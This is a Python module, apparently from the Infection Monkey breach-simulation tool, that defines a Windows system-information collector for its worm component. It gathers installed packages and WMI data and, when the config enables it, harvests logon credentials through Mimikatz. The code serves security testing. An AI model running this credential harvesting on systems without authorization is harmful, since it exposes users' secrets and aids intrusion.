import os
import logging
import sys

sys.coinit_flags = 0  # needed for proper destruction of the wmi python module
# noinspection PyPep8
import infection_monkey.config
# noinspection PyPep8
from infection_monkey.system_info.mimikatz_collector import MimikatzCollector
# noinspection PyPep8
from infection_monkey.system_info import InfoCollector
# noinspection PyPep8
from infection_monkey.system_info.wmi_consts import WMI_CLASSES
# noinspection PyPep8
from common.utils.wmi_utils import WMIUtils

LOG = logging.getLogger(__name__)
LOG.info('started windows info collector')

__author__ = 'uri'


class WindowsInfoCollector(InfoCollector):
    """
    System information collecting module for Windows operating systems
    """

    def __init__(self):
        super(WindowsInfoCollector, self).__init__()
        self._config = infection_monkey.config.WormConfiguration
        self.info['reg'] = {}
        self.info['wmi'] = {}

    def get_info(self):
        """
        Collect Windows system information
        Hostname, process list and network subnets
        Tries to read credential secrets using mimikatz
        :return: Dict of system information
        """
        LOG.debug("Running Windows collector")
        super(WindowsInfoCollector, self).get_info()
        # TODO: Think about returning self.get_wmi_info()
        self.get_installed_packages()
        from infection_monkey.config import WormConfiguration
        if WormConfiguration.should_use_mimikatz:
            self.get_mimikatz_info()

        return self.info

    def get_installed_packages(self):
        LOG.info('getting installed packages')
        self.info["installed_packages"] = os.popen("dism /online /get-packages").read()
        self.info["installed_features"] = os.popen("dism /online /get-features").read()
        LOG.debug('Got installed packages')

    def get_wmi_info(self):
        LOG.info('getting wmi info')
        for wmi_class_name in WMI_CLASSES:
            self.info['wmi'][wmi_class_name] = WMIUtils.get_wmi_class(wmi_class_name)
        LOG.debug('finished get_wmi_info')

    def get_mimikatz_info(self):
        mimikatz_collector = MimikatzCollector()
        mimikatz_info = mimikatz_collector.get_logon_info()
        if mimikatz_info:
            if "credentials" in self.info:
                self.info["credentials"].update(mimikatz_info)
            self.info["mimikatz"] = mimikatz_collector.get_mimikatz_text()
            LOG.info('Mimikatz info gathered successfully')
        else:
            LOG.info('No mimikatz info was gathered')
